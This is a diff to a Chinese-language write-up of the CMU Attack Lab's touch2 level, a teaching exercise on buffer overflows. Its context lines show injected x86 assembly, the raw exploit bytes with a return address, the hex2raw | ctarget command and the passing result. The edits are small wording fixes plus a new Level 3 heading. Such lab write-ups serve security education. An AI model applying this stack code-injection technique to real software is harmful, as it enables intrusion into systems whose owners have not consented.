@@ -222,7 +222,7 @@ void touch2(unsigned val){
 
 
 
-有了這個向法，就可以清楚的設計注入程式碼:
+有了這個想法，就可以清楚的設計注入程式碼:
 
 ```asm
 movl $0x59b997fa, %edi
@@ -256,7 +256,7 @@ bf fa 97 b9 59 68 ec 17
 78 dc 61 55 00 00 00 00
 ```
 
-最後只要將字節碼寫入`touch2.txt`中，然後`./hex2raw < touch2.txt | ./ctarget -q`執行就可以了
+最後只要將字節碼寫入`touch2.txt`中，然後`./hex2raw < touch2.txt | ./ctarget -q`執行就可以順利通過
 
 > 注意地址與字節碼的順序
 
@@ -271,4 +271,8 @@ PASS: Would have posted the following:
 	result	1:PASS:0xffffffff:ctarget:2:BF FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 
 
 ```
+
+
+
+### Level 3
 
